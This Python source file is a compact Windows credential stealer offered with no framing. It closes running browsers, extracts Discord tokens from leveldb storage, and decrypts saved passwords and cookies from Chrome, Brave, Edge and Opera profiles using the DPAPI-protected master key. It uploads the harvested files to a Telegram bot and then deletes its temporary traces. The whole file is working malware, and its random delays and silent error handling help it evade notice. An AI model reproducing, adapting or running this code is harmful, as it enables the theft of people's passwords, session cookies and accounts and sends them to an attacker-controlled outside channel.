import os,re,sys,time,random,requests,psutil,win32crypt
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect
from Cryptodome.Cipher import AES

fns={'c':f"t_{random.randint(1000,9999)}.dat",'p':f"t_{random.randint(1000,9999)}.dat",'t':f"t_{random.randint(1000,9999)}.dat",'tdb':f"t_{random.randint(1000,9999)}.db",'cdb':f"t_{random.randint(1000,9999)}.db"}
tbt="token"
tci="chatid"

def cbp():
 for p in psutil.process_iter(['name']):
  try:
   if p.info['name'].lower() in ['chrome.exe','firefox.exe','msedge.exe','opera.exe','brave.exe']:p.terminate();time.sleep(2)
  except:continue

def op():
 l=os.getenv('LOCALAPPDATA');r=os.getenv('APPDATA')
 return{'Discord':f"{r}\\Discord",'Discord_Canary':f"{r}\\discordcanary",'Discord_PTB':f"{r}\\discordptb",'Chrome':f"{l}\\Google\\Chrome\\User Data\\Default",'Opera':f"{r}\\Opera Software\\Opera Stable",'Brave':f"{l}\\BraveSoftware\\Brave-Browser\\User Data\\Default",'Yandex':f"{l}\\Yandex\\YandexBrowser\\User Data\\Default",'OperaGX':f"{r}\\Opera Software\\Opera GX Stable"}

def gbp():
 l=os.getenv('LOCALAPPDATA');r=os.getenv('APPDATA')
 p={"Chrome":f"{l}\\Google\\Chrome","Brave":f"{l}\\BraveSoftware\\Brave-Browser","Edge":f"{l}\\Microsoft\\Edge","Opera":f"{r}\\Opera Software\\Opera Stable","OperaGX":f"{r}\\Opera Software\\Opera GX Stable"}
 cp=f"{l}\\Google\\Chrome\\User Data"
 if os.path.exists(cp):
  for i in os.listdir(cp):
   if i.startswith("Profile "):p["Chrome_Profile"]=f"{cp}\\{i}"
 return p

def dt(b,mk):
 try:
  return AES.new(win32crypt.CryptUnprotectData(mk,None,None,None,0)[1],AES.MODE_GCM,b[3:15]).decrypt(b[15:])[:-16].decode()
 except:
  return None

def gdt(p):
 t=set();c=[]
 if not os.path.exists(p):return t
 lp=f"{p}\\Local State";ldbp=f"{p}\\Local Storage\\leveldb\\"
 if os.path.exists(lp):
  try:
   with open(lp,"r")as f:k=loads(f.read())['os_crypt']['encrypted_key'];mk=b64decode(k)[5:]
   if os.path.exists(ldbp):
    for fl in os.listdir(ldbp):
     if fl.endswith(".ldb")or fl.endswith(".log"):
      try:
       with open(ldbp+fl,"r",errors='ignore')as f:
        ct=f.read()
        for m in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",ct):
         if m not in c:c.append(m)
      except:continue
    for tk in c:
     try:d=dt(b64decode(tk.split('dQw4w9WgXcQ:')[1]),mk);t.add(d)if d else None
     except:continue
  except:pass
 try:
  for fn in os.listdir(p):
   if fn.endswith('.log')or fn.endswith('.ldb'):
    try:
     with open(f'{p}\\{fn}',errors='ignore')as f:
      for ln in f:
       for rx in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):
        for ft in re.findall(rx,ln):t.add(ft)
    except:continue
 except:pass
 return t

def gc(ak,iv):return AES.new(ak,AES.MODE_GCM,iv)
def dp(c,p):
 try:return c.decrypt(p)
 except:return None

def dbd(lsp,ldp,cp,bn):
 if not os.path.exists(lsp):return
 try:
  with open(lsp)as f:ls=loads(f.read());mke=b64decode(ls["os_crypt"]["encrypted_key"])[5:];mk=win32crypt.CryptUnprotectData(mke,None,None,None,0)[1]
 except:return
 if os.path.exists(ldp):
  try:
   copy2(ldp,fns['tdb']);conn=connect(fns['tdb']);cursor=conn.cursor();cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
   with open(fns['p'],"a",encoding='utf-8')as f:f.write(f"\n--- {bn} Passwords ---\n")
   for u,un,pw in cursor.fetchall():
    if u and un and pw:
     try:iv=pw[3:15];enc=pw[15:-16];c=gc(mk,iv);d=dp(c,enc);dstr=d.decode('utf-8',errors='ignore')
     except:continue
     with open(fns['p'],"a",encoding='utf-8')as f:f.write(f"URL: {u}\nUser: {un}\nPass: {dstr}\n\n")
   conn.close()
  except:pass
 if os.path.exists(cp):
  try:
   copy2(cp,fns['cdb']);conn=connect(fns['cdb']);cursor=conn.cursor();cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
   with open(fns['c'],"a",encoding='utf-8')as f:f.write(f"\n--- {bn} Cookies ---\n")
   for h,n,v in cursor.fetchall():
    if h and n and v and"google"not in h:
     try:iv=v[3:15];enc=v[15:-16];c=gc(mk,iv);d=dp(c,enc);dstr=d.decode('utf-8',errors='ignore')
     except:continue
     with open(fns['c'],"a",encoding='utf-8')as f:f.write(f"Host: {h}\nName: {n}\nValue: {dstr}\n\n")
   conn.close()
  except:pass

def stt(fp):
 if not tbt or tbt=="YOUR_BOT_TOKEN_HERE":return False
 try:
  u=f"https://api.telegram.org/bot{tbt}/sendDocument"
  with open(fp,'rb')as f:fs={'document':f};d={'chat_id':tci};r=requests.post(u,data=d,files=fs,timeout=30);return r.status_code==200
 except:return False

def cl():
 for f in [fns['tdb'],fns['cdb'],fns['p'],fns['c'],fns['t']]:
  try:
   if os.path.exists(f):os.remove(f)
  except:pass

def m():
 try:
  time.sleep(random.uniform(1,3));tf=set()
  for n,p in op().items():
   if"Discord"in n and os.path.exists(p):
    try:t=gdt(p);tf.update(t)
    except:continue
  if tf:
   with open(fns['t'],"w",encoding='utf-8')as f:
    f.write("Discord Tokens:\n")
    for t in tf:f.write(f"{t}\n")
  cbp();bs=gbp()
  for n,p in bs.items():
   try:
    ls=f"{p}\\User Data\\Local State";ld=f"{p}\\User Data\\Default\\Login Data";c=f"{p}\\User Data\\Default\\Network\\Cookies"
    if"Profile"in p:ld=f"{p}\\Login Data";c=f"{p}\\Network\\Cookies"
    dbd(ls,ld,c,n)
   except:continue
  for f in [fns['t'],fns['p'],fns['c']]:
   if os.path.exists(f)and os.path.getsize(f)>0:stt(f);time.sleep(random.uniform(1,2))
 except:pass
 finally:cl();sys.exit(0)

if __name__=="__main__":m()